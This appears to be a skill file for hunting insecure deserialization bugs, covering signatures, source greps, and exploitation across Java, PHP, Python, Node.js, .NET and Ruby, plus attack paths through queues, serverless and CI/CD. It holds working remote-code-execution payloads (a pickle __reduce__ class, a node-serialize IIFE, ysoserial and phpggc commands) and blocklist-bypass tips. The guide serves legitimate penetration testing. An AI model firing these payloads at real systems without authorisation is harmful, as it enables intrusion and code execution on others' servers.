---
name: hunt-deserialization
description: "Hunt insecure deserialization vulnerabilities — RCE via gadget chains, auth bypass via object field tampering, DoS via resource bombs. Covers Java (ObjectInputStream, ysoserial, 30+ gadget chains), PHP (unserialize, PHAR wrappers, phpggc), .NET (BinaryFormatter, SoapFormatter), Python (pickle, unsafe yaml.load), Node.js (node-serialize _$$ND_FUNC$$_ IIFE), Ruby (Marshal.load, YAML.load), Golang (encoding/gob type confusion), Rust (serde). Modern vectors: Kubernetes CRD controllers, message queues (Kafka/RabbitMQ/Redis), serverless Lambda triggers, CI/CD pipelines (Jenkins remoting), GraphQL custom scalars. Detection: hex ac ed 00 05 or Base64 rO0 (Java), O:<len>: (PHP), AAEAAAD///// (.NET), pickle opcodes (Python). Use when testing deserialization endpoints, session cookies with serialized objects, file upload processors, message queue consumers, or any endpoint accepting binary/serialized data."
---

# Insecure Deserialization

## When to Use
- Large opaque blobs in cookies, headers, or request bodies
- Unusual content-types (application/x-java-serialized-object, etc.)
- Session tokens that decode to object structures
- File upload/import features processing binary formats
- Message queue consumers, serverless triggers, CI/CD pipelines

## When NOT to Use
- Application only uses JSON with no custom deserializers
- No serialized data visible in traffic

---

## Shortcut

1. Search source for deserialization that touches user input
2. If black-box, look for large opaque blobs (cookies, headers, bodies) and unusual content-types
3. Identify features that must deserialize user-supplied data (session, jobs/queues, file metadata, tokens)
4. If identity is embedded, tamper to attempt auth bypass
5. Try to escalate to RCE/logic abuse carefully and non-destructively

---

## Recognizing Serialized Data

| Language | Signature | Example |
|---|---|---|
| Java | hex `ac ed 00 05` or Base64 `rO0` | ObjectInputStream |
| PHP | `O:<len>:"Class":...` (often Base64) | unserialize() |
| .NET | Base64 `AAEAAAD/////` | BinaryFormatter |
| Python | pickle opcodes | pickle.loads() |
| Node.js | `_$$ND_FUNC$$_` in JSON | node-serialize |
| Ruby | Marshal binary or YAML | Marshal.load() |

---

## Language-Specific Exploitation

### Java
```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Common gadget chains:
# - CommonsCollections1-7 (Apache Commons)
# - Spring1-4 (Spring Framework)
# - Groovy1 (Groovy runtime)
# - JRMPClient (JRMP callback)
```

**Source grep:**
```bash
grep -rn "ObjectInputStream\|readObject\|readUnshared" --include="*.java"
grep -rn "XMLDecoder\|XStream" --include="*.java"
```

### PHP
```bash
# Generate payload with phpggc
phpggc Laravel/RCE1 system id

# PHAR deserialization (no unserialize() call needed)
# Any file operation on phar:// triggers deserialization
phar://uploads/evil.phar/test.txt
```

**Source grep:**
```bash
grep -rn "unserialize\|phar://" --include="*.php"
```

### Python
```python
# pickle RCE via __reduce__
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

**Source grep:**
```bash
grep -rn "pickle\.loads\|yaml\.load\|yaml\.unsafe_load" --include="*.py"
```

### Node.js
```javascript
// node-serialize RCE via IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

**Source grep:**
```bash
grep -rn "serialize\|unserialize\|funcster" --include="*.js" --include="*.ts"
```

### .NET
```bash
# ysoserial.net for .NET gadget chains
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "id"
```

**Source grep:**
```bash
grep -rn "BinaryFormatter\|SoapFormatter\|ObjectStateFormatter" --include="*.cs"
```

---

## Modern Attack Vectors

### Kubernetes / Containers
- ConfigMaps/Secrets deserialized without validation
- Admission webhooks deserializing AdmissionReview objects
- CRD controllers with unsafe deserialization in reconciliation loops

### Message Queues
```python
# Vulnerable consumer pattern
msg = consumer.receive()
data = pickle.loads(msg)  # Attacker controls msg if they have producer access
```
- Kafka, RabbitMQ, Redis consumers blindly deserializing
- Compromise all consumers processing the poisoned queue

### Serverless
- AWS Lambda event payloads from S3/SNS/SQS triggers
- Upload malicious serialized object to S3 → Lambda deserializes → RCE

### CI/CD Pipelines
- Jenkins Java deserialization in remoting protocol (multiple CVEs)
- GitLab Runners YAML deserialization with unsafe anchors
- Build artifacts from untrusted sources

---

## Bypass Techniques

1. **Alternate gadgets** — switch payload chains if blocklists present
2. **Type confusion** — change expected types to bypass weak validation
3. **Indirect paths** — sink data into storage that another component later deserializes
4. **Format-specific** — PHAR wrappers, XML entity tricks, language-specific quirks
5. **Post-deserialization** — abuse magic methods that run before validation

---

## Impact & Severity

| Impact | Severity |
|---|---|
| RCE via gadget chains | Critical |
| Auth bypass via field tampering (is_admin, role) | Critical/High |
| Arbitrary file read/write | High |
| DoS via resource bombs (billion laughs) | Medium |
| Downstream SQLi with tainted fields | High |

---

## Tools

| Tool | Language | Purpose |
|---|---|---|
| ysoserial | Java | 30+ gadget chain payloads |
| phpggc | PHP | PHP gadget chain generator |
| ysoserial.net | .NET | .NET gadget chains |
| marshalsec | Java | Alternative Java chains |
| Burp Deserialization Scanner | All | Automated detection |
| Semgrep | All | Source-level sink detection |

---

## Related Skills
- **`hunt-rce`** — Deserialization is a common RCE vector
- **`hunt-api-misconfig`** — JWT/session tokens may contain serialized data
- **`hunt-file-upload`** — PHAR deserialization via file upload
- **`hunt-waf-bypass`** — Encoding techniques to bypass WAF on serialized payloads
